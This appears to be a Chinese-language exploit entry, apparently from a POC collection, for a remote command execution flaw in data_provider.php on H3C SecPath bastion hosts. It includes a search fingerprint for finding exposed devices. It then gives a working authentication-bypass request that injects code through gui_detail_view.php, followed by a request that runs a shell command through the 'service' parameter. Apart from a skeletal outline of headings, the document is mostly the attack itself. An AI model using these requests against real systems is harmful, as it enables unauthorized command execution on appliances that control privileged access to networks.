# H3CSecPath堡垒机data_provider.php远程命令执行漏洞

- **系统**：H3CSecPath　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="H3C-SecPath-运维审计系统"`
- **请求**：`GET /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin HTTP/1.1`

**请求体 / payload**
```
1. 通过POC设置cookie
Host: xx.xx.xx.xx
Cookie: PHPSESSID=grlcbpjqpu59r6aanqjsn2gao0
Sec-Fetch-User: ?1
2. 通过设置的cookie执行命令
GET /audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(pwd)&identity_cond=&query_type=all&format=json&browse=true HTTP/1.1
Host: xx.xx.xx.xx
Cookie: PHPSESSID=grlcbpjqpu59r6aanqjsn2gao0
Sec-Fetch-User: ?1
>
```

**其他**
- H3C SecPath堡垒机 data_provider.php 远程命令执行漏洞: + 一、漏洞简介
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: + H3C SecParh堡垒机